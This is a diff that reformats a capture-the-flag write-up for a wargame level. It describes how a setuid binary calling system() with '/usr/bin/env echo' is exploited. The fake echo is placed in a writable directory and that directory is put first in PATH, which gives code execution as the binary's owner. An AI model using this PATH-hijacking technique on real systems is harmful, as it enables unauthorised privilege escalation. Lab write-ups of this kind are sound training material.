@@ -1,51 +1,44 @@
-# --- reconnaisance ---
-- ls -la
+## Phase 1: Reconnaissance
 
-- found executable 
+Initial investigation involved listing the directory contents with `ls -la`
 
-- once ran it asks to be exploited (uwu)
->so probably reverse engineering then indentifying and exploiting a vulnerability
+An executable file was found that, when run, asks to be exploited
 
+This indicates an exercise on reverse engineering and vulnerability exploitation
 
-# --- target research on system ---
+---
 
-- lets do some analysis on the file
+## Phase 2: Target Research on System
 
-- file ./level03
+I analyzed the file with the following command:
+
+```bash
+file ./level03
+```
+
+The output was:
+
 ```txt
 ./level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
 ```
->so its an executable...
 
-- strings ./level03
-> revealed it.s a c file, gnu c 4.6.3 compiled exec, uses types.h 
-- look for vulnerable functions in the output
->vulnerable functions like strcpy, gets, scanf, sprintf, memcpy 
-- strings ./level03 | grep "strcpy"
->nothing interesting..
+</br>
 
+Further investigation with the `strings` command revealed it's a C file, compiled with GNU C 4.6.3
+>A search for vulnerable C functions (such as `strcpy`, `gets`, `scanf`, `sprintf`, `memcpy`) didn't reveal anything interesting
 
+</br>
 
-- lets intercept .dll calls with ltrace ./level03
-```txt
-__libc_start_main(0x80484a4, 1, 0xbffff6e4, 0x8048510, 0x8048580 <unfinished ...>
-getegid()                                                                                                  = 2003
-geteuid()                                                                                                  = 2003
-setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                        = 0
-setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280)                                                        = 0
-system("/usr/bin/env echo Exploit me"Exploit me
- <unfinished ...>
---- SIGCHLD (Child exited) ---
-<... system resumed> )                                                                                     = 0
+I used `ltrace` to intercept `.dll` calls and found that the `system()` function is used to call a shell command (`/usr/bin/env echo Exploit me`) which might be exploitable
+
+```bash
+ltrace ./level03
 ```
-- maybe system() function exploitable ?
-> this function is used to call a shell command (/usr/bin/env echo Exploit me) 
+</br>
+I transfered the executable to my local machine and opened it with IDA Free disassembler
 
+>The `main` function of the binary was examined:
 
-- will use a disassembler now
-> scp the file to ur local machine and open it w ghidra or ida free
-
-- output of the main function of the binary
 ```c
 int __cdecl main(int argc, const char **argv, const char **envp)
 {
@@ -59,37 +52,44 @@ int __cdecl main(int argc, const char **argv, const char **envp)
   return system("/usr/bin/env echo Exploit me");
 }
 ```
-> viewing the source code in plain C made me recognize an angle of attack 
-
-> what this function " system("/usr/bin/env echo Exploit me"); " does is search for the first instance of the 'echo' command in the directories listed in the PATH env variable
-> so if you create a fake echo (AND NOT echo.sh !! remove the extension) it will run your echo instead of the system's echo
-
-- echo $PATH
-
-> ```bash
-> /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
-> ```
-> basically to execute my malicious echo i simply need to add its path at the beginning of the string, this is because the system looks for the first echo to execute and ignores any subsequent ones
-
-- we will search for all folders where i have write access to to start writing our echo
-> find / -type d -writable 2>/dev/null
-
-- we will write our echo script in /var/tmp
->for starters it will just be
->```sh
->echo "EXPLOITED"
-``
-- then add its path to PATH + give it executable permission
-- export PATH=/var/tmp:$PATH
-- chmod +x /var/tmp/echo
-
-- run the binary once again and see if it prints "EXPLOITED" this time
->if it does, it sucessfully runs arbitrary code
->add the command whoami, it should print flag03
 
 
-## --- solved ---
+- I found that the function `system("/usr/bin/env echo Exploit me")` searches for the first instance of the `echo` command in the directories listed in the `PATH` environment variable, therefore, creating a fake `echo` command could allow it to be executed instead of the system's `echo`
+
+---
+
+## Phase 3: Exploitation
+
+Writable folders were searched for to start writing the fake `echo` script:
+
+```bash
+find / -type d -writable 2>/dev/null
+```
+
+A simple test script was created to confirm the vunlnerability and added in `/var/tmp`:
+
+```bash
+echo "EXPLOITED"
+```
+
+The path of the script was added to the `PATH` environment variable and executable permission was granted:
+
+```bash
+export PATH=/var/tmp:$PATH
+chmod +x /var/tmp/echo
+```
+
+After running the binary again, it successfully prints "EXPLOITED", indicating successful arbitrary code execution
+
+Adding the `whoami` command to the script printed `flag03`, confirming the exploit
+
+---
+
+## Solved
+
 <details>
-        <summary>solution</summary>
-         add getflag command and get the token and move to level04
-    </details>  
+        <summary>Click to reveal solution</summary>
+        Adding the getflag command to the fake echo script, obtain the token, and move to level04
+</details>  
+
+---
